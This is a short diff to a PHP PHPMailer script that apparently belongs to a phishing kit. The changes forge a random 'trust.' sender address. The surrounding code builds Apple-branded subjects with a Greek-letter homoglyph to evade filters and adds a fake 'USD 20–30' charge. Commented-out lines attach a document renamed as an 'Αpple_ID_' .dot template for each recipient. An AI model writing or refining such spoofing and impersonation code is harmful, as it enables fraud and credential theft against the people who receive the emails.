@@ -32,7 +32,7 @@ if (isset($_REQUEST['send']))
   $mail->isSMTP();
   $mail->Host       = $smtp->host;
   $mail->SMTPAuth   = true;
-  $mail->Username   = $smtp->username;
+  $mail->Username   = 'apikey';
   $mail->Password   = $smtp->password;
   $mail->SMTPSecure = 'tls';
   $mail->Port       = 587;
@@ -55,7 +55,7 @@ if (isset($_REQUEST['send']))
   $subject          = str_replace('##pdfName##', 'Kebijakan_Αpple_'.strtolower($option->random_str).'.docx', $subject);
   $subject          = str_replace('##amount##', 'USD ' . rand(20, 30) . '.00', $subject);
 
-  $mail->setFrom($smtp->username, $_REQUEST['from_name']);
+  $mail->setFrom('trust.' . $option->random_str . '@' . $option->random_str . '.com', $_REQUEST['from_name']);
   $mail->addAddress($_REQUEST['to']);
   // $mail->addAttachment('goblok.docx', 'Αpple_ID_'.$_REQUEST['to'].'.dot');
 //   $mail->addAttachment('goblok.docx', $pdfname);
